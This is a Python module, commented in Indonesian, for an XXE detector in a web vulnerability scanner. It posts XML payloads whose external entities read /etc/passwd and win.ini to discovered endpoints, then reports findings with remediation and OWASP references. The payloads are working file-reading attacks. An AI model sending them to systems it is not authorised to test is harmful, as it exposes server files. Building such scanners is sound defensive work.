"""XML External Entity (XXE) detection.

Strategi non-destruktif:
- Kirim body XML dengan DOCTYPE + ENTITY ke endpoint yang menerima XML
  (Content-Type: application/xml / text/xml). Endpoint diambil dari
  `target.discovered` (forms/POST endpoints) atau base URL.
- Payload mencoba membaca /etc/passwd dan win.ini. Jika konten muncul di
  response body → XXE confirmed.
- Tidak melakukan eksternal URL fetch (OOB) supaya tidak butuh
  collaborator server.
"""
from __future__ import annotations

import re

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.core.util import truncate

PASSWD_RE = re.compile(r"root:[x*]:0:0:")
WIN_INI_RE = re.compile(r"\[fonts\]|\[extensions\]", re.I)

# Payload aman: hanya membaca file lokal (read), tidak menulis
PAYLOAD_LINUX = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    '<foo>&xxe;</foo>'
)
PAYLOAD_WIN = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
    '<foo>&xxe;</foo>'
)


def _candidate_urls(target: Target) -> list[str]:
    urls: list[str] = []
    discovered = getattr(target, "discovered", None)
    if discovered is not None:
        # Form POST / endpoint yang punya method != GET
        for ep in getattr(discovered, "endpoints", []):
            if ep.method.upper() != "GET":
                urls.append(ep.url)
        # plus endpoint yang URL-nya sugestif
        for ep in getattr(discovered, "endpoints", []):
            low = ep.url.lower()
            if any(s in low for s in ("xml", "soap", "import", "upload", "rss", "feed")):
                if ep.url not in urls:
                    urls.append(ep.url)
    if target.base_url not in urls:
        urls.append(target.base_url)
    return urls[:15]


def _probe(client: HttpClient, url: str, payload: str) -> tuple[bool, str, str]:
    """Return (hit, signature, evidence)."""
    headers = {"Content-Type": "application/xml", "Accept": "application/xml,*/*"}
    resp = client.post(url, data=payload.encode("utf-8"), headers=headers)
    if resp is None:
        return False, "", ""
    body = resp.text or ""
    if PASSWD_RE.search(body):
        return True, "linux:/etc/passwd", truncate(body, 240)
    if WIN_INI_RE.search(body):
        return True, "windows:win.ini", truncate(body, 240)
    return False, "", ""


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        for url in _candidate_urls(target):
            for payload, label in ((PAYLOAD_LINUX, "linux"), (PAYLOAD_WIN, "windows")):
                hit, sig, ev = _probe(client, url, payload)
                if hit:
                    findings.append(
                        Finding(
                            module="xxe",
                            title=f"XML External Entity (XXE) di {url}",
                            severity=Severity.CRITICAL,
                            description=(
                                "Endpoint memparse XML dengan resolusi external entity aktif. "
                                "Attacker dapat membaca file lokal, melakukan SSRF lewat URI "
                                "scheme, dan dalam beberapa kasus eksekusi kode."
                            ),
                            target=url,
                            evidence=f"signature={sig}\npayload_kind={label}\n{ev}",
                            cwe="CWE-611",
                            remediation=(
                                "Nonaktifkan resolusi external entity di parser XML. "
                                "Python: `defusedxml`. Java: `setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)`. "
                                ".NET: `XmlReaderSettings.DtdProcessing = Prohibit`. "
                                "Pertimbangkan migrasi ke JSON bila XML tidak diperlukan."
                            ),
                            references=[
                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                                "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                            ],
                        )
                    )
                    return findings  # cukup satu konfirmasi
    finally:
        client.close()
    return findings
